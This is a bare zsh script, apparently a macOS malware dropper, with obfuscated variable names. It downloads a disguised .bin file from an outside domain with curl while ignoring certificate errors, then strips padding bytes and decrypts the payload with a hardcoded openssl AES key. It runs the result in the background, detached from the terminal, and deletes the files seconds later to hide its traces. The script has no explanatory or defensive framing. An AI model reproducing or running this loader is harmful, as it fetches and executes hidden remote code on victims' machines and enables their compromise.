#!/bin/zsh
awkjc=$(mktemp /tmp/3pyfm2.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/mff28862106cb9979.bin" -o "$awkjcz" || exit 1
mjq3tm=$(stat -f %z "$awkjcz"); kpx8phc=$(( mjq3tm - 2700 - 3278 ))
tail -c +$(( 2700 + 1 )) "$awkjcz" | head -c $kpx8phc | openssl enc -d -aes-256-cbc -k 8db8f0e1eb58503d31c0a911 -out "$awkjc" 2>/dev/null
[ -s "$awkjc" ] && chmod 700 "$awkjc" && ( "$awkjc" & ) && disown
( sleep 3; rm -f "$awkjc" "$awkjcz" ) &>/dev/null &
